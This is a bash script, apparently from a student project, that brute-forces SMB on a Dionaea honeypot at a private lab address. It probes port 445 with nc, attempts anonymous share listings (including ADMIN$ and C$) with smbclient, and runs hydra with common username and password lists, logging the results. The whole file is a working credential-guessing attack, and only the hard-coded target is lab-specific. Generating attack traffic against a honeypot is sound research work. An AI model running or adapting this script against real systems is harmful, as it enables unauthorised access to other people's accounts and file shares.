#!/bin/bash
# SMB brute force - targets Dionaea

DIONAEA="172.16.0.30"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/brute_force"
USERS="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASS="/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt"

mkdir -p "$LOGDIR"

echo "SMB brute force on $DIONAEA"

if nc -zw2 "$DIONAEA" 445 2>/dev/null; then
    smbclient -L //$DIONAEA -N 2>&1 > "$LOGDIR/smb_null_${DIONAEA}.txt"
    
    for share in "Public" "IPC$" "ADMIN$" "C$"; do
        smbclient //$DIONAEA/"$share" -N -c "dir" 2>&1 >> "$LOGDIR/smb_shares_${DIONAEA}.txt"
    done
    
    timeout 600 hydra -L "$USERS" -P "$PASS" -t 4 -o "$LOGDIR/smb_${DIONAEA}.txt" smb://$DIONAEA 2>/dev/null
else
    echo "SMB not open"
fi

echo "Done"
